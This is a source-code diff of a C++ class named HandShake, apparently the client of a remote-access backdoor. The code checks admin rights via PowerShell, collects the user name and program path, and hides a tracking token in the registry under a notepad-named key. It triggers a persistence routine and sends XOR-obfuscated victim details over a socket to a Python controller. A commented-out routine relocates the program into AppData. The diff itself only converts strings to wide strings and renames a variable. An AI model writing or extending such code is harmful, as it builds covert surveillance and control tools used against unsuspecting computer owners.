@@ -13,16 +13,16 @@ HandShake::HandShake()
     a_name_user = setNameUser();
     a_is_admin = setIsAdmin();
     a_current_directory = setCurrentDirectory();
-    a_name_prog = NAME_PROG;
+
     a_token = getTokenOrSetTokenInRegistry();
     
-    if(strlen(a_token.c_str()) != a_size_token) //If an error occurred and the token is not the size of a_size_token:
+    if(wcslen(a_token.c_str()) != a_size_token) //If an error occurred and the token is not the size of a_size_token:
     {
         // Tokken not found
-        a_token = to_utf8(generateToken(a_size_token));
+        a_token = generateToken(a_size_token);
         //cout << "New token: " << a_token << endl;
     }
-    a_location_prog = setLocationProg();
+    a_path_prog = setLocationProg();
 }
 
 
@@ -34,15 +34,17 @@ void HandShake::setSock(int sock)
 
 void HandShake::beforeHandShake()
 {
+    /*
     if(AUTO_MOVE) 
     {
         moveProg();
     }
-    //a_location_prog = setLocationProg();
+    */
+    //a_path_prog = setLocationProg();
     
     if(AUTO_PERSISTENCE)
     {
-        Persistence(a_is_admin, a_location_prog).main();
+        Persistence(a_is_admin, a_path_prog).main();
     }
 
 }
@@ -51,24 +53,24 @@ void HandShake::beforeHandShake()
 void HandShake::startHandShake()
 {
     // ' SPLIT ' for split data in python server.py script
-    string is_admin;
-    string end = "\r\n";
+    wstring is_admin;
+    wstring end = L"\r\n";
 
     if(a_is_admin)
     {
         //If admin
-        is_admin = "MOD_HANDSHAKE_IS_ADMIN" SPLIT "True";
+        is_admin = L"MOD_HANDSHAKE_IS_ADMIN" SPLIT "True";
     }
     else
     {
         //if not admin
-        is_admin = "MOD_HANDSHAKE_IS_ADMIN" SPLIT "False";
+        is_admin = L"MOD_HANDSHAKE_IS_ADMIN" SPLIT "False";
     }
-    //cout << a_location_prog << endl;
+    //cout << a_path_prog << endl;
     //cout << a_name_user << endl;
-    string path_prog = "MOD_HANDSHAKE_PATH_PROG" SPLIT + a_location_prog;
-    string name_user = "MOD_HANDSHAKE_NAME_USER"  SPLIT + a_name_user;
-    string token = "MOD_HANDSHAKE_TOKEN" SPLIT + a_token;
+    wstring path_prog = L"MOD_HANDSHAKE_PATH_PROG" SPLIT + a_path_prog;
+    wstring name_user = L"MOD_HANDSHAKE_NAME_USER"  SPLIT + a_name_user;
+    wstring token = L"MOD_HANDSHAKE_TOKEN" SPLIT + a_token;
    
     sendUltraSafe(a_sock, XOREncryption(is_admin));
     sendUltraSafe(a_sock, XOREncryption(path_prog));
@@ -80,10 +82,10 @@ void HandShake::startHandShake()
 
 bool HandShake::setIsAdmin()
 {
-    vector <string> result;
+    vector <wstring> result;
 
-    result = Exec().executeCommand("powershell.exe -command \"([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')\"");
-    if(result[0].substr(0,4) == "True") //remove ruturn line.
+    result = Exec().executeCommand(L"powershell.exe -command \"([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')\"");
+    if(result[0].substr(0,4) == L"True") //remove ruturn line.
     {
         //cout << "ADMIN IN setadmin: " << result.substr(0,4) << endl;
         return true;
@@ -96,61 +98,56 @@ bool HandShake::setIsAdmin()
 }
 
 
-string HandShake::setNameUser()
+wstring HandShake::setNameUser()
 {
 
-    TCHAR user[UNLEN+1];
+    WCHAR user[UNLEN+1];
     DWORD len_user = UNLEN+1;
-    if(GetUserName(user,&len_user) == 0)
+    if(GetUserNameW(user,&len_user) == 0)
     {
         //if error
-        return "Unknown";
+        return L"Unknown";
     }
     else
     {
-        string result(&user[0], &user[len_user]); //https://stackoverflow.com/questions/6291458/how-to-convert-a-tchar-array-to-stdstring
-        //2 cout <<"name user: " <<result << endl;
+        wstring result(&user[0], &user[len_user]); //https://stackoverflow.com/questions/6291458/how-to-convert-a-tchar-array-to-stdstring
+        wcout <<"name user: " <<result << endl;
         return result.substr(0,result.length()-1);    
     }
     
 }
 
 
-string HandShake::setCurrentDirectory()
+wstring HandShake::setCurrentDirectory()
 {
-
-    char buffer[PATHLEN];
-    _getcwd(buffer,PATHLEN);
-    if(buffer == NULL)
+    WCHAR buff[MAX_PATH];
+    if(GetCurrentDirectoryW(MAX_PATH, buff) ==  0)
     {
-        return "Unknown";
+        //if error
+        _wgetcwd(buff, MAX_PATH);
+        wcout << "error path: " << buff << endl;
+        return (wstring) buff;
     }
     else
     {
-        return (string) buffer;
+        return (wstring) buff;
     }
 }
 
 
-string HandShake::setLocationProg()
+wstring HandShake::setLocationProg()
 {
-    char buffer[MAX_PATH];
+    WCHAR buffer[MAX_PATH];
 
-    if(GetModuleFileNameA(NULL, buffer, sizeof(buffer)) == 0)//if error
+    if(GetModuleFileNameW(NULL, buffer, MAX_PATH) == 0)//if error
     {   
-        if(_getcwd(buffer,sizeof(buffer)) == 0)//if error
-        {
-            string result_cmd;
-            return (string) result_cmd + "\\" + NAME_PROG;
-        }
-        else
-        {
-            return (string) buffer;
-        }
+        ;
+        return (wstring) L"ERROR SET LOCATION PROG"; //To change !
+        
     }
     else
     {
-        return (string) buffer;        
+        return (wstring) buffer;        
     }
 }
 
@@ -169,7 +166,7 @@ wstring HandShake::generateToken(const int token_size)//https://www.codespeedy.c
 }
 
 
-string HandShake::getTokenOrSetTokenInRegistry()
+wstring HandShake::getTokenOrSetTokenInRegistry()
 {
     wstring tmp_return;
 
@@ -217,7 +214,7 @@ string HandShake::getTokenOrSetTokenInRegistry()
         if(status != 0)
         {
             //if If the notepad key has not been created.  
-            return to_utf8(generateToken(a_size_token));
+            return generateToken(a_size_token);
         }
         else
         {
@@ -249,16 +246,16 @@ string HandShake::getTokenOrSetTokenInRegistry()
     else
     {
         //cout << "token no set" << endl;
-        tmp_return = buffer;
+        
         RegCloseKey(hKey);
         
-        return to_utf8(tmp_return);
+        return (wstring) buffer;
        
     }
     //cout << "token set " << endl;
     RegCloseKey(hKey);
-    tmp_return = token;
-    return to_utf8(tmp_return);
+    
+    return (wstring) token;
     
 }
 
@@ -269,42 +266,43 @@ bool HandShake::getIsAdmin()
 }
 
 
-string HandShake::getPathProg()
+wstring HandShake::getPathProg()
 {
-    //cout << "GetPathProg: " << a_location_prog << endl;
-    return a_location_prog;
+    //cout << "GetPathProg: " << a_path_prog << endl;
+    return a_path_prog;
 }
 
 
-string HandShake::getNameUser()
+wstring HandShake::getNameUser()
 {
     return a_name_user;
 }
 
-string HandShake::getToken()
+wstring HandShake::getToken()
 {
     return a_token; 
 }
 
-
+/*
 void HandShake::moveProg()
 {
    // Deplace le programme en fonction des privilèges de l'utilisateur.
     if(a_is_admin)
     {   
-        if((rename(a_name_prog.c_str(), (a_location_prog).c_str())!=0))
+        if((rename(a_name_prog.c_str(), (a_path_prog).c_str())!=0))
         {   
-            a_location_prog = a_current_directory + "\\" + a_name_prog; //if error
+            a_path_prog = a_current_directory + "\\" + a_name_prog; //if error
         }
     }
     else
     {
         //C:\Users\cisco\AppData\Roaming\Microsoft
         //if not adminW
-        if((rename(a_name_prog.c_str(),(a_location_prog).c_str()))!= 0)
+        if((rename(a_name_prog.c_str(),(a_path_prog).c_str()))!= 0)
         {
             //perror("Error in move prog ");  
-            a_location_prog = a_current_directory + "\\" + a_name_prog; 
+            a_path_prog = a_current_directory + "\\" + a_name_prog; 
         }
     }
 }
+*/
